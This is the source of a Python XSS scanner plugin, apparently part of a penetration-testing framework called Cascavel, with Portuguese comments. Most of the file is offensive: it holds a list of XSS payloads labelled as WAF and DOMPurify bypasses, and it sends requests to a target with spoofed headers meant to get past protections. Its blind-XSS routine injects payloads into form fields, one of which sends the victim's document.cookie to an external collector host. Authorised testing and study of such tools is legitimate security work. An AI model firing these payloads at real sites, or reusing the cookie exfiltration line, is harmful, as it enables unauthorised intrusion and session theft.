# plugins/xss_scanner.py — Cascavel 2026 Intelligence
import re
import urllib.parse

import requests

PARAMS = [
    "q",
    "search",
    "query",
    "s",
    "keyword",
    "id",
    "page",
    "name",
    "url",
    "input",
    "msg",
    "text",
    "redirect",
    "callback",
    "ref",
    "next",
    "return_url",
    "error",
    "title",
    "lang",
    "data",
    "value",
    "content",
    "template",
    "path",
    "file",
    "view",
    "action",
    "type",
]

# ──────────── PAYLOADS 2026-GRADE ────────────
REFLECTED_PAYLOADS = [
    # Clássicos
    ("<script>alert(1)</script>", "CLASSIC"),
    ('"><img src=x onerror=alert(1)>', "IMG_ONERROR"),
    ("'-alert(1)-'", "JS_CONTEXT"),
    ("<svg onload=alert(1)>", "SVG_ONLOAD"),
    # WAF Bypass 2026 — Cloudflare/Akamai/Imperva
    ("<Img/Src/OnError=(alert)(1)>", "CLOUDFLARE_BYPASS"),
    ("<svg/onload=confirm`1`>", "BACKTICK_BYPASS"),
    ("<details open ontoggle=alert(1)>", "DETAILS_TOGGLE"),
    ("<video><source onerror=alert(1)>", "VIDEO_SOURCE"),
    ("<body onpageshow=alert(1)>", "BODY_PAGESHOW"),
    ("<marquee onstart=alert(1)>", "MARQUEE_ONSTART"),
    ("<input onfocus=alert(1) autofocus>", "AUTOFOCUS_TAGLESS"),
    ("<select autofocus onfocus=alert(1)>", "SELECT_AUTOFOCUS"),
    # Unicode obfuscation
    ("<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>", "UNICODE_BYPASS"),
    # HTML entity bypass
    ("<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "HTML_ENTITY"),
    # CharCode bypass
    ("<script>alert(String.fromCharCode(88,83,83))</script>", "CHARCODE_BYPASS"),
    # Polyglot XSS (Rsnake/Gareth Heyes 2025)
    (
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a"
        "//</stYle/</teleseTitle/</teleseArea/</teleseScript/--><svg/onload=alert()//>",
        "POLYGLOT_2026",
    ),
    # Angular/Vue sandbox escape
    ('{{constructor.constructor("return this")().alert(1)}}', "ANGULAR_ESCAPE"),
    ("{{_openBlock.constructor('alert(1)')()}}", "VUE3_ESCAPE"),
    # DOM clobbering
    ("<form><input name=innerHTML><input name=innerHTML>", "DOM_CLOBBERING"),
    # Mutation XSS (DOMPurify bypass 2025)
    ('<noscript><p title="</noscript><img src=x onerror=alert(1)>">', "MUTATION_XSS"),
    ("<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>", "MATH_MUTATION"),
    # Double encoding bypass
    ("%253Cscript%253Ealert(1)%253C/script%253E", "DOUBLE_ENCODE"),
    # SVG animate
    ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "SVG_ANIMATE"),
    # Template literal injection
    ("`${alert(1)}`", "TEMPLATE_LITERAL"),
]

# Payloads para detecção de DOM-based XSS (source→sink patterns)
DOM_SOURCES = [
    "location.hash",
    "location.search",
    "location.href",
    "document.URL",
    "document.referrer",
    "document.cookie",
    "window.name",
    "postMessage",
]

DOM_SINKS = [
    "innerHTML",
    "outerHTML",
    "document.write",
    "document.writeln",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    ".src=",
    ".href=",
    ".action=",
    "jQuery.html(",
    "$.html(",
    "v-html",
    "dangerouslySetInnerHTML",
]

# Headers para bypass WAF
BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
]


def _test_reflected(target, param):
    """Testa payloads XSS refletidos em GET com bypass headers."""
    for payload, method in REFLECTED_PAYLOADS:
        url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
        for headers in [{}] + BYPASS_HEADERS:
            try:
                resp = requests.get(
                    url, timeout=6, allow_redirects=True, headers={**{"User-Agent": "Cascavel/2.0"}, **headers}
                )
                if payload in resp.text:
                    return {
                        "tipo": "XSS_REFLETIDO",
                        "metodo": method,
                        "parametro": param,
                        "payload": payload[:80],
                        "reflexao": True,
                        "status_http": resp.status_code,
                        "severidade": "CRITICO" if "RCE" in method or "ESCAPE" in method else "ALTO",
                        "bypass_header": list(headers.keys())[0] if headers else None,
                    }
            except Exception:
                continue
    return None


def _test_reflected_post(target, param):
    """Testa payloads XSS via POST body (JSON + form-data)."""
    for payload, method in REFLECTED_PAYLOADS[:10]:
        try:
            resp = requests.post(f"http://{target}/", data={param: payload}, timeout=6)
            if payload in resp.text:
                return {
                    "tipo": "XSS_REFLETIDO_POST",
                    "metodo": method,
                    "parametro": param,
                    "payload": payload[:80],
                    "severidade": "ALTO",
                }
        except Exception:
            continue
    return None


def _detect_dom_xss(target):
    """Analisa JavaScript da página para padrões DOM-based XSS (source→sink)."""
    findings = []
    try:
        resp = requests.get(f"http://{target}/", timeout=8)
        body = resp.text

        # Buscar scripts inline e externos
        scripts = re.findall(r"<script[^>]*>(.*?)</script>", body, re.DOTALL | re.IGNORECASE)
        js_content = "\n".join(scripts) + "\n" + body

        for source in DOM_SOURCES:
            if source in js_content:
                for sink in DOM_SINKS:
                    if sink in js_content:
                        # Verificar se source feeds into sink (heuristic)
                        source_idx = js_content.index(source)
                        sink_idx = js_content.index(sink)
                        # Source deve aparecer antes ou perto do sink (+-500 chars)
                        if abs(source_idx - sink_idx) < 500:
                            findings.append(
                                {
                                    "tipo": "XSS_DOM_BASED",
                                    "source": source,
                                    "sink": sink,
                                    "severidade": "ALTO",
                                    "descricao": f"Potencial DOM XSS: {source} → {sink}",
                                }
                            )
    except Exception:
        pass
    # Deduplicar por source+sink
    seen = set()
    unique = []
    for f in findings:
        key = f"{f['source']}:{f['sink']}"
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique


def _detect_blind_xss_sinks(target):
    """Injeta blind XSS payloads em campos que podem ser renderizados em painel admin."""
    blind_payloads = [
        '<img src=x onerror=fetch("https://xss.report/c/cascavel")>',
        '"><script src=https://xss.report/c/cascavel></script>',
        '\'><img src=x onerror=this.src="https://xss.report/c/cascavel?c="+document.cookie>',
    ]
    blind_params = ["name", "email", "comment", "feedback", "message", "subject", "body"]
    injected = []
    for param in blind_params:
        for payload in blind_payloads:
            try:
                requests.post(f"http://{target}/", data={param: payload}, timeout=5)
                injected.append({"parametro": param, "payload": payload[:60]})
                break
            except Exception:
                continue
    if injected:
        return {
            "tipo": "XSS_BLIND_INJECTION",
            "severidade": "ALTO",
            "descricao": "Blind XSS payloads injetados — verificar painel admin do alvo",
            "campos_injetados": injected,
        }
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner XSS 2026-Grade — Reflected, DOM-based, Blind, Mutation.

    Técnicas: Polyglot payloads, WAF bypass (Cloudflare/Akamai/Imperva),
    DOM clobbering, mutation XSS (DOMPurify bypass), Angular/Vue sandbox escape,
    blind XSS injection, double encoding, autofocus tagless, SVG animate.
    25 reflected payloads + DOM source→sink analysis + blind XSS injection.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    # 1. Reflected XSS — GET + headers bypass
    for param in PARAMS:
        vuln = _test_reflected(target, param)
        if vuln:
            vulns.append(vuln)

    # 2. Reflected XSS — POST
    for param in PARAMS[:15]:
        vuln = _test_reflected_post(target, param)
        if vuln:
            vulns.append(vuln)

    # 3. DOM-based XSS detection
    dom_vulns = _detect_dom_xss(target)
    vulns.extend(dom_vulns)

    # 4. Blind XSS injection
    blind = _detect_blind_xss_sinks(target)
    if blind:
        vulns.append(blind)

    return {
        "plugin": "xss_scanner",
        "versao": "2026.1",
        "tecnicas": ["reflected", "dom_based", "blind", "mutation", "polyglot", "waf_bypass"],
        "resultados": vulns if vulns else "Nenhum XSS detectado",
    }
